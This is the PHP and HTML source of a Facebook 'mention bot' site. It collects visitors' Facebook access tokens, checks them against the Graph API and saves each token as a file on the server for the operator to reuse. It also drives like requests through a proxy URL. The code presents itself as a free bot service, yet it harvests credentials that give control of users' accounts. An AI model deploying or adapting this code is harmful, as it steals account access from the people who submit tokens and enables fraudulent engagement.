 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
 CRACKERS BOTTER MENTION BOT
</title><link rel="stylesheet" type="text/css" href="na.css"

<?php
$yx=opendir('sahib');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> myToken($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidtoken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function mytoken($access){
if(!is_dir('sahib')){
mkdir('sahib');
}
$a=fopen('sahib/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidtoken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<center> <a target="_blank" href="http://www.facebook.com/100027065658389"> <center> <img src="https://graph.facebook.com/100027065658389/picture?width=900" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<center><li><a href="http://nir-token.tk/" target="blank"><font color="white">GET TOKEN  </font></center></a></li>

</font><br>
 <font color="yellow"> <center></br><form action=""method="POST"><input class="input" type="text"name="access_token" style="height:28px;" value=""><input class="submit" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:25px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
</font><br>
<center> <font color="yellow"> MADE BY :-  <a href="https://www.facebook.com/100027065658389" target="blank"><font color="white">Nir Rana
 <br></center>

</div>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<br>
<center> <a target="_blank" href="http://www.facebook.com/100027065658389"> <center> <img src="https://graph.facebook.com/100027065658389/picture?width=900" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot site: || Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="index.php" method="post">
<center><input class="submit" type="submit" value="Click Here To Add Other T0ken"></center>
<br>
<br>
<br>
<center> <font color="blue"> DESIGN BY :-  <a href="https://www.facebook.com/100027065658389" target="blank"><font color="white">Nir Rana <br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
<br>
<br>
<center><font size="5"><?php include 'topper.php';?><br></font></p></h2>
<br /><br /><marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="6" direction="left" truespeed="truespeed">

<qcenter><font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> <img src="https://i.imgur.com/Hlf4Aa2.gif" /><font color="red"><b>THANKS FOR USING OUR TEAM BOT SITE, share site to other friends.
<img src="https://i.imgur.com/DZOB6iP.gif" /> </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red"></font></qcenter></marquee>

